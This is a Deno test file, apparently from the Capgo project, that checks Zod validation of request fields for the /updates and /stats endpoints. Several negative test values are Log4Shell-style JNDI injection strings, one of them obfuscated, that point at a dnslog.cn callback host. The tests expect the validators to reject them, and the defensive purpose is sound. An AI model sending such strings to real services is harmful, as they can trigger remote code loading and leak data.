import { assertEquals, assertExists, assertStringIncludes } from 'https://deno.land/std@0.224.0/assert/mod.ts'
import { z } from 'https://deno.land/x/zod@v3.23.8/mod.ts'
import { INVALID_STRING_APP_ID, INVALID_STRING_DEVICE_ID, MISSING_STRING_APP_ID, MISSING_STRING_DEVICE_ID, MISSING_STRING_PLATFORM, MISSING_STRING_VERSION_BUILD, MISSING_STRING_VERSION_NAME, MISSING_STRING_VERSION_OS, NON_STRING_APP_ID, NON_STRING_DEVICE_ID, NON_STRING_PLATFORM, NON_STRING_VERSION_BUILD, NON_STRING_VERSION_NAME, NON_STRING_VERSION_OS, deviceIdRegex, reverseDomainRegex } from '../_backend/utils/utils.ts'

const NO_ERROR = { error: '' }
// import { jsonRequestSchema as updateRequestSchema } from '../supabase/functions/updates/index.ts'
// import { jsonRequestSchema as statsRequestSchema } from '../supabase/functions/stats/index.ts'

// TODO: once the issue described here is fixed: https://github.com/Cap-go/capgo/pull/399#issuecomment-1749394964
// 1. uncomment `import { jsonRequestSchema as updateRequestSchema } ...`
// 2. uncomment `import { jsonRequestSchema as statsRequestSchema } ...`
// 2. next delete `import { z } ...`
// 3. then delete lines 18-80
const updateRequestSchema = z.object({
  app_id: z.string({
    required_error: MISSING_STRING_APP_ID,
    invalid_type_error: NON_STRING_APP_ID,
  }),
  device_id: z.string({
    required_error: MISSING_STRING_DEVICE_ID,
    invalid_type_error: NON_STRING_DEVICE_ID,
  }).max(36),
  version_name: z.string({
    required_error: MISSING_STRING_VERSION_NAME,
    invalid_type_error: NON_STRING_VERSION_NAME,
  }),
  version_build: z.string({
    required_error: MISSING_STRING_VERSION_BUILD,
    invalid_type_error: NON_STRING_VERSION_BUILD,
  }),
  is_emulator: z.boolean().default(false),
  is_prod: z.boolean().default(true),
}).refine(data => reverseDomainRegex.test(data.app_id), {
  message: INVALID_STRING_APP_ID,
}).refine(data => deviceIdRegex.test(data.device_id), {
  message: INVALID_STRING_DEVICE_ID,
}).transform((val) => {
  if (val.version_name === 'builtin')
    val.version_name = val.version_build

  return val
})
const statsRequestSchema = z.object({
  app_id: z.string({
    required_error: MISSING_STRING_APP_ID,
    invalid_type_error: NON_STRING_APP_ID,
  }),
  device_id: z.string({
    required_error: MISSING_STRING_DEVICE_ID,
    invalid_type_error: NON_STRING_DEVICE_ID,
  }).max(36),
  platform: z.string({
    required_error: MISSING_STRING_PLATFORM,
    invalid_type_error: NON_STRING_PLATFORM,
  }),
  version_name: z.string({
    required_error: MISSING_STRING_VERSION_NAME,
    invalid_type_error: NON_STRING_VERSION_NAME,
  }),
  version_os: z.string({
    required_error: MISSING_STRING_VERSION_OS,
    invalid_type_error: NON_STRING_VERSION_OS,
  }),
  version_code: z.optional(z.string()),
  version_build: z.optional(z.string()),
  action: z.optional(z.string()),
  custom_id: z.optional(z.string()),
  channel: z.optional(z.string()),
  plugin_version: z.optional(z.string()),
  is_emulator: z.boolean().default(false),
  is_prod: z.boolean().default(true),
}).refine(data => reverseDomainRegex.test(data.app_id), {
  message: INVALID_STRING_APP_ID,
}).refine(data => deviceIdRegex.test(data.device_id), {
  message: INVALID_STRING_DEVICE_ID,
})

interface RequestJSON {
  app_id?: string | number
  device_id?: string | number
  version_name?: string | number | boolean
  version_build?: string | number | boolean
  version_code?: string
  version_os?: string | number | boolean
  platform?: string | number | boolean
  plugin_version?: string
  is_prod?: boolean
  is_emulator?: boolean
  custom_id?: string
}

const requestJSON: RequestJSON = {
  app_id: 'ee.forgr.demoapp',
  device_id: '9929AFAD-ECF1-4D7F-B0C1-A8CE463C6684',
  version_name: 'builtin',
  version_build: '1.0.1',
  version_code: '1',
  version_os: '16.0',
  platform: 'ios',
  plugin_version: '5.2.18',
  is_prod: false,
  is_emulator: true,
  custom_id: '',
}

const schemas = [updateRequestSchema, statsRequestSchema]
let index = 1
Deno.test({
  name: `test schemas`,
  async fn(t) {
    const steps = []

    for (const schema of schemas) {
      steps.push(
        t.step({
          name: `app_id missing ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            delete body.app_id
            assertEquals(body.app_id, undefined)
            const response = parseJSON(body, schema)
            assertStatements(response, MISSING_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id with underscore is valid ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = 'ee.forgr.demo_app'
            const response = parseJSON(body, schema)
            assertEquals(response, NO_ERROR)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id with hyphen is valid ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = 'ee.forgr.demo-app'
            const response = parseJSON(body, schema)
            assertEquals(response, NO_ERROR)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #1 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = 1000000000000000000000000000
            const response = parseJSON(body, schema)
            assertStatements(response, NON_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #2 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = ''
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #3 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = '.ee.forgr.demoapp'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #4 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = 'eeforgrdemoapp'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #5 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = 'app_${indi:${lower:I}${lower:d}a${lower:p}://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' // eslint-disable-line no-template-curly-in-string
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #6 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = 'ee.forgr.demo+app'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id invalid #7 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = '[appid]'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id missing ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            delete body.device_id
            const response = parseJSON(body, schema)
            assertStatements(response, MISSING_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #1 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = 2_000_000_000
            const response = parseJSON(body, schema)
            assertStatements(response, NON_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #2 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = 'ECF1-4D7F-B0C1-A8CE463C6684'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #3 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = '9929AFAD-4D7F-B0C1-A8CE463C6684'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #4 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = '9929AFAD-ECF1-B0C1-A8CE463C6684'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #5 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = '9929AFAD-ECF1-4D7F-B0C1-'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #6 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = '9929AFADECF14D7FB0C1A8CE463C6684'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #7 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = 'A243AFAD-ECF1-4D7F-B0C1-A8CE463C560'
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #8 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = ''
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id invalid #9 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = 'device_${jndi:ldap://1694362129451P}' // eslint-disable-line no-template-curly-in-string
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_DEVICE_ID)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `device_id length exceeded ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.device_id = 'device_${jndi:ldap://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' // eslint-disable-line no-template-curly-in-string
            const response = parseJSON(body, schema)
            assertStatements(response, 'String must contain at most 36 character(s)')
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `version_name missing ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            delete body.version_name
            const response = parseJSON(body, schema)
            assertStatements(response, MISSING_STRING_VERSION_NAME)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `version_name invalid #1 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.version_name = 300000
            const response = parseJSON(body, schema)
            assertStatements(response, NON_STRING_VERSION_NAME)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `version_name invalid #2 ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.version_name = true
            const response = parseJSON(body, schema)
            assertStatements(response, NON_STRING_VERSION_NAME)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id and device_id missing ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            delete body.app_id
            delete body.device_id
            const response = parseJSON(body, schema)
            assertStatements(response, MISSING_STRING_APP_ID)
            assertStatements(response, MISSING_STRING_DEVICE_ID, 1)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        }),
        t.step({
          name: `app_id and device_id are invalid ${getSuffix(index)}`,
          fn: () => {
            const body = getJSON()
            body.app_id = '123456768'
            body.device_id = '${jndi:ldap://4q0tv0.dnslog.cn}' // eslint-disable-line no-template-curly-in-string
            const response = parseJSON(body, schema)
            assertStatements(response, INVALID_STRING_APP_ID)
            assertStatements(response, INVALID_STRING_DEVICE_ID, 1)
          },
          sanitizeOps: false,
          sanitizeResources: false,
          sanitizeExit: false,
        })
      )
      index++
    }

    await Promise.all(steps)
  },
})

/**
 * Validation for the /updates endpoint.
 */
Deno.test({
  name: 'test version_build - /updates',
  only: false,
  async fn(t) {
    await Promise.all([
      t.step({
        name: 'version_build missing',
        fn: () => {
          const body = getJSON()
          delete body.version_build
          const response = parseJSON(body, updateRequestSchema)
          assertStatements(response, MISSING_STRING_VERSION_BUILD)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
      t.step({
        name: 'version_build invalid #1',
        fn: () => {
          const body = getJSON()
          body.version_build = 4000000
          const response = parseJSON(body, updateRequestSchema)
          assertStatements(response, NON_STRING_VERSION_BUILD)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
      t.step({
        name: 'version_build invalid #2',
        fn: () => {
          const body = getJSON()
          body.version_build = true
          const response = parseJSON(body, updateRequestSchema)
          assertStatements(response, NON_STRING_VERSION_BUILD)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
    ])
  },
})

/**
 * Validation for the /stats endpoint.
 */
Deno.test({
  name: 'test version_os - /stats',
  only: false,
  async fn(t) {
    await Promise.all([
      t.step({
        name: 'version_os missing',
        fn: () => {
          const body = getJSON()
          delete body.version_os
          const response = parseJSON(body, statsRequestSchema)
          assertStatements(response, MISSING_STRING_VERSION_OS)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
      t.step({
        name: 'version_os invalid #1',
        fn: () => {
          const body = getJSON()
          body.version_os = -5000000
          const response = parseJSON(body, statsRequestSchema)
          assertStatements(response, NON_STRING_VERSION_OS)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
      t.step({
        name: 'version_os invalid #2',
        fn: () => {
          const body = getJSON()
          body.version_os = false
          const response = parseJSON(body, statsRequestSchema)
          assertStatements(response, NON_STRING_VERSION_OS)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
    ])
  },
})

Deno.test({
  name: 'test platform - /stats',
  async fn(t) {
    await Promise.all([
      t.step({
        name: 'platform missing',
        fn: () => {
          const body = getJSON()
          delete body.platform
          const response = parseJSON(body, statsRequestSchema)
          assertStatements(response, MISSING_STRING_PLATFORM)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
      t.step({
        name: 'platform invalid #1',
        fn: () => {
          const body = getJSON()
          body.platform = -6000000
          const response = parseJSON(body, statsRequestSchema)
          assertStatements(response, NON_STRING_PLATFORM)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
      t.step({
        name: 'platform invalid #2',
        fn: () => {
          const body = getJSON()
          body.platform = true
          const response = parseJSON(body, statsRequestSchema)
          assertStatements(response, NON_STRING_PLATFORM)
        },
        sanitizeOps: false,
        sanitizeResources: false,
        sanitizeExit: false,
      }),
    ])
  },
})

function getJSON(): RequestJSON {
  return Object.assign({}, requestJSON)
}

function parseJSON(body: RequestJSON, jsonRequestSchema: any) {
  const parseResult = jsonRequestSchema.safeParse(body)
  if (!parseResult.success)
    return { error: `Cannot parse json: ${parseResult.error}`, nestedError: parseResult.error }
  else
    return NO_ERROR
}

function assertStatements(response: any, expectedErrorMessage: string, errorIndex = 0) {
  assertExists(response.error)
  assertStringIncludes(response.error, 'Cannot parse json: ')
  assertExists(response.nestedError)
  assertExists(response.nestedError.issues[errorIndex])
  assertExists(response.nestedError.issues[errorIndex].message)
  assertEquals(response.nestedError.issues[errorIndex].message, expectedErrorMessage)
}

function getSuffix(index: number): string {
  return index % 2 === 0 ? '- /stats' : '- /updates'
}
